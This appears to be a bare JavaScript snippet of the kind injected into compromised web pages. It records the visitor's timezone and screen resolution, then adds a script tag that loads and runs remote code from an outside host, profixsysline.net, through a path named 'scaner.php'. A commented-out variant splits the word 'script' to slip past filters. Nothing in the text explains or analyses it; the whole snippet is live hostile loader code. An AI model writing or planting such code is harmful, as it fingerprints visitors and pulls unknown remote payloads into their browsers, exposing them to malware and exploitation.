<!--
function tzSignature() {
	var tz;
	try {
		var currDate = new Date();
		var currTime = currDate.toString();
		tz = currDate.getTimezoneOffset();
		if ( (currTime.indexOf("PDT") > 0) ||
		     (currTime.indexOf("MDT") > 0) ||
		     (currTime.indexOf("CDT") > 0) ||
		     (currTime.indexOf("EDT") > 0) ||
		     (currTime.indexOf("Daylight") > 0) )
			tz += 60;
		tz = - tz / 60;
	} catch (e) {
		tz = "";
	}
	return tz;
}

function rsSignature() {
	var rs;
	try {
		var rsWidth = screen.width;
		var rsHeight = screen.height;
		var rs = rsWidth + "x" + rsHeight;
	} catch (e) {
		rs = "";
	}
	return rs;
}

var script = document.createElement("script");

script.src="http://profixsysline.net//plix/scaner.php?id=4&tz="+tzSignature()+'&rs='+rsSignature();

document.head.appendChild(script);

//document.write('<sc'+'ript type="text/javascript" src="http://profixsysline.net//plix/scaner.php?id=4&tz='+tzSignature()+'&rs='+rsSignature()+'"></sc'+'ript>');
//-->
